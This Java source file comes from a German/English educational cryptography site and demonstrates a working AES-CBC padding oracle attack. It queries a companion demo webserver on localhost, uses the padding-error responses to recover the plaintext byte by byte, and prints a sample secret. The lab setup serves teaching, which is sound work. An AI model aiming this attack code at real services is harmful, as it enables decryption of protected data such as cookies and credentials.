package net.bplaced.javacrypto.unsecure;

/*
* Herkunft/Origin: http://javacrypto.bplaced.net/
* Programmierer/Programmer: Michael Fehr
* Copyright/Copyright: frei verwendbares Programm (Public Domain)
* Copyright: This is free and unencumbered software released into the public domain.
* Lizenztext/Licence: <http://unlicense.org>
* getestet mit/tested with: Java Runtime Environment 8 Update 191 x64
* getestet mit/tested with: Java Runtime Environment 11.0.1 x64
* Datum/Date (dd.mm.jjjj): 09.10.2019
* Projekt/Project: G05 AES Padding Orakel / G05 AES Padding Oracle
* Funktion: zeigt die Unsicherheit durch das Padding Orakel
* Function: shows the unsecurement through the padding oracle
*
* Sicherheitshinweis/Security notice
* Die Programmroutinen dienen nur der Darstellung und haben keinen Anspruch auf eine korrekte Funktion, 
* insbesondere mit Blick auf die Sicherheit ! 
* Prüfen Sie die Sicherheit bevor das Programm in der echten Welt eingesetzt wird.
* The program routines just show the function but please be aware of the security part - 
* check yourself before using in the real world !
* 
* Das Projekt basiert auf dem nachfolgenden Artikel:
* The project is based on this article:
* https://blog.skullsecurity.org/2013/a-padding-oracle-example
* 
* Das Programm benötigt den gestarteten Webserver (G05_AesPaddingOracleWebserver).
* Before you start this program the webserver needs to get started first
* (G05_AesPaddingOracleWebserver).
* 
*/

import java.util.Arrays;
import java.util.Base64;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

public class G05_AesPaddingOracle {

	public static void main(String[] args) throws Exception {
		System.out.println("G05 AES CBC Padding Oracle");

		// init der variablen
		byte[] iv16Byte = null; // init-vector für aes
		byte[] ciphertextOrgByte = null; // ciphertext from encryption
		byte[] ciphertextCompleteByte = null; // iv+ciphertextOrgByte
		String ciphertextCompleteBase64 = "";

		int blockLengthInt = 16;
		int blockNumberInt = 0; // ctCompleteByte.length / blockLengthInt
		byte[] inputByte = null; // gesamte daten iv + ct für die übergabe an die oracle-routine

		byte[] ciphertextBlock1Byte = null; // linker cipherttext
		byte[] ciphertextBlock2Byte = null; // rechter ciphertext
		byte[] plaintextBlock2Byte = null;  // rechter plaintext

		// die erzeugung des ciphertextes ist diesem programm grundsaetzlich unbekannt

		// ciphertextCompleteBase64 =
		// "MTIzNDU2Nzg5MGFiY2RlZj33PQPvsvin1HlKw9z7HFTS8Oiw35RMU/0TI0dxmENJ"; // aus
		// dem cookie
		// data: Tom #Geheim1 #
		// MTIzNDU2Nzg5MGFiY2RlZj33PQPvsvin1HlKw9z7HFTS8Oiw35RMU/0TI0dxmENJ
		// alternative daten
		ciphertextCompleteBase64 = "MTIzNDU2Nzg5MGFiY2RlZtgYNOrTB3i6R+yyVv9f8XUlg+Rg/REhlyn5Wfbt443x";
		// data: Johns #SecretPW#
		// MTIzNDU2Nzg5MGFiY2RlZtgYNOrTB3i6R+yyVv9f8XUlg+Rg/REhlyn5Wfbt443x
		ciphertextCompleteByte = Base64.getDecoder().decode(ciphertextCompleteBase64);

		// aufteilung iv + ciphertext
		iv16Byte = Arrays.copyOfRange(ciphertextCompleteByte, 0, 16);
		ciphertextOrgByte = Arrays.copyOfRange(ciphertextCompleteByte, 16, ciphertextCompleteByte.length);

		blockNumberInt = ciphertextCompleteByte.length / blockLengthInt;
		// output of the data
		System.out.println("Encryption process data (AES)");
		System.out.println("ctComplete length:" + ciphertextCompleteByte.length + " blockLengthInt:" + blockLengthInt
				+ " blockNumberInt:" + blockNumberInt);
		System.out.println("ctCompleteByte   :" + bytesToHex(ciphertextCompleteByte));
		System.out.println("iv16Byte         :" + bytesToHex(iv16Byte));
		System.out.println("ciphertextOrgByte                                :" + bytesToHex(ciphertextOrgByte));

		System.out.println("----------------------------------------");
		System.out.println("Cutting ciphertextCompleteByte in blocks");
		inputByte = Arrays.copyOf(ciphertextCompleteByte, ciphertextCompleteByte.length); // complete data
		System.out.println("inputByte :" + bytesToHex(inputByte));
		// block 1:
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 0, 16);
		System.out.println("ct 01     :" + bytesToHex(ciphertextBlock1Byte));
		// block 2:
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 16, 32);
		System.out.println("ct 02                                     :" + bytesToHex(ciphertextBlock1Byte));
		// block 3:
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 32, 48);
		System.out.println("ct 03                                                                     :"
				+ bytesToHex(ciphertextBlock1Byte));
		// block 3:
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 48, 64);
		System.out.println(
				"ct 04                                                                                                     :"
						+ bytesToHex(ciphertextBlock1Byte));
		System.out.println("----------------------------------------");
		System.out.println("Tampering block 2 with block 1");
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 0, 16);
		System.out.println("ct 01 :" + bytesToHex(ciphertextBlock1Byte));
		ciphertextBlock2Byte = Arrays.copyOfRange(inputByte, 16, 32);
		System.out.println("ct 02 :" + bytesToHex(ciphertextBlock2Byte));
		System.out.println("----------------------------------------");

		plaintextBlock2Byte = PaddingOracleWrapperExW(ciphertextBlock1Byte, ciphertextBlock2Byte, blockLengthInt);
		System.out.println("plaintextBlock1Byte str:" + new String(plaintextBlock2Byte));
		String ptBlock2 = new String(plaintextBlock2Byte);

		System.out.println("----------------------------------------");
		System.out.println("Tampering block 3 with block 2");
		ciphertextBlock1Byte = Arrays.copyOfRange(inputByte, 16, 32);
		System.out.println("ct 02 :" + bytesToHex(ciphertextBlock1Byte));
		ciphertextBlock2Byte = Arrays.copyOfRange(inputByte, 32, 48);
		System.out.println("ct 03 :" + bytesToHex(ciphertextBlock2Byte));
		System.out.println("----------------------------------------");

		plaintextBlock2Byte = PaddingOracleWrapperExW(ciphertextBlock1Byte, ciphertextBlock2Byte, blockLengthInt);
		System.out.println("plaintextBlock2Byte str:" + new String(plaintextBlock2Byte));
		System.out.println("----------------------------------------");
		String ptBlock3 = new String(plaintextBlock2Byte);
		// unpadding
		int unpadInt = unpad(plaintextBlock2Byte, 0, 16);
		// public int unpad(byte[] in, int off, int len) {
		String ptBlock3Unpad = ptBlock3.substring(0, unpadInt);

		System.out.println("Daten im Klartext");
		String ptBlock23 = ptBlock2 + ptBlock3Unpad;
		System.out.println("plaintextBlockByte2+3:" + ptBlock23);
		System.out.println("----------------------------------------");

		System.out.println("G05 AES CBC Padding Oracle beendet");
	}

	// nutzt einen externen webserver als oracle
	public static byte[] PaddingOracleWrapperExW(byte[] ciphertextBlock1Byte, byte[] ciphertextBlock2Byte,
			int blockLengthInt) throws Exception {
		byte[] ciphertextBlock1ByteT = null;
		byte[] plaintextBlock2Byte = null;
		int ciphertextBlock1ByteTByte = 0;
		int poD = 0;
		// ab hier mit einer methode fuer die kapselung
		ciphertextBlock1ByteT = Arrays.copyOf(ciphertextBlock1Byte, ciphertextBlock1Byte.length);
		for (int i = 0; i < blockLengthInt; i++) {
			ciphertextBlock1ByteT[i] = (byte) 0;
		}
		plaintextBlock2Byte = Arrays.copyOf(ciphertextBlock1ByteT, ciphertextBlock1ByteT.length);
		// schleife beginnt am ende
		for (int TB = (blockLengthInt - 1); TB >= 0; TB--) {
			ciphertextBlock1ByteTByte = TB; // tampering byte 0..8 bzw. 0..15
			// calculate last byte of ciphertextBlock1ByteT[5+6+7]:
			for (int cal = 0; (cal + ciphertextBlock1ByteTByte) < (blockLengthInt); cal++) {
				ciphertextBlock1ByteT[(ciphertextBlock1ByteTByte
						+ cal)] = (byte) ((byte) (blockLengthInt - ciphertextBlock1ByteTByte)
								^ (byte) plaintextBlock2Byte[(ciphertextBlock1ByteTByte + cal)]
								^ ciphertextBlock1Byte[(ciphertextBlock1ByteTByte + cal)]);
			}
			poD = PaddingOracle16ExW(ciphertextBlock1Byte, ciphertextBlock1ByteT, ciphertextBlock2Byte,
					ciphertextBlock1ByteTByte);
			plaintextBlock2Byte[ciphertextBlock1ByteTByte] = (byte) poD;
		}
		return plaintextBlock2Byte;
	}

	// nutzung eines externen webservers als oracle
	// antworten des oracels
	// 0=decryption 1=bad padding 2=general error
	public static int PaddingOracle16ExW(byte[] ciphertextBlock1Byte, byte[] ciphertextBlock1ByteT,
			byte[] ciphertextBlock2Byte, int number) throws Exception {
		byte po = 0; 
		int DecryptStatus = 0;
		int poD = 0;
		for (int i = 0; i < 256; i++) {
			ciphertextBlock1ByteT[number] = (byte) i;
			byte[] input = new byte[ciphertextBlock1ByteT.length + ciphertextBlock2Byte.length];
			System.arraycopy(ciphertextBlock1ByteT, 0, input, 0, 16);
			System.arraycopy(ciphertextBlock2Byte, 0, input, 16, ciphertextBlock2Byte.length);
			Base64.Encoder encURL = Base64.getUrlEncoder();
			byte[] inputUrl = encURL.encode(input);
			String inputString = new String(inputUrl);

			// aufruf des webservers
			DecryptStatus = getCode(inputString);
			if (DecryptStatus == 0) {
				po = (byte) i;
				break;
			}
		}
		poD = ((byte) (16 - number) ^ po ^ ciphertextBlock1Byte[number]);
		return poD;
	}

	// präparierte zeile an den server senden
	public static int getCode(String zeileString) {
		Integer code = 1;
		String hostString = "http://localhost:8079/";
		String sendString = hostString + zeileString;

		try {
			URL url = new URL(sendString);
			URLConnection con = url.openConnection();
			con.connect();
			String head = con.getHeaderField(0);
			if (head.equals("HTTP/1.1 500 Invalid Padding") || head.equals("HTTP/1.1 500 Internal Server Error")) {
				code = 1;
			} else if (head.equals("HTTP/1.1 200 OK")) {
				code = 0;
			} else if (head.equals("HTTP/1.1 400 Bad Request")) {
				code = 2;
			} else {
				code = 2;
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return code;
	}

	private static String bytesToHex(byte[] hash) {
		return printHexBinary(hash);
	}
	
	public static String printHexBinary(byte[] bytes) {
		final char[] hexArray = "0123456789ABCDEF".toCharArray();
		char[] hexChars = new char[bytes.length * 2];
		for (int j = 0; j < bytes.length; j++) {
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}

	/**
	 * Returns the index where the padding starts.
	 *
	 * <p>
	 * Given a buffer with padded data, this method returns the index where the
	 * padding starts.
	 *
	 * @param in  the buffer with the padded data
	 * @param off the offset in <code>in where the padded data starts
	 * @param len the length of the padded data
	 *
	 * @return the index where the padding starts, or -1 if the input is not
	 *         properly padded
	 */
	public static int unpad(byte[] in, int off, int len) {
		int blockSize = 16;
		if ((in == null) || (len == 0)) { // this can happen if input is really a padded buffer
			return 0;
		}
		byte lastByte = in[off + len - 1];
		int padValue = (int) lastByte & 0x0ff;
		if ((padValue < 0x01) || (padValue > blockSize)) {
			return -1;
		}
		int start = off + len - ((int) lastByte & 0x0ff);
		if (start < off) {
			return -1;
		}
		for (int i = 0; i < ((int) lastByte & 0x0ff); i++) {
			if (in[start + i] != lastByte) {
				return -1;
			}
		}
		return start;
	}
}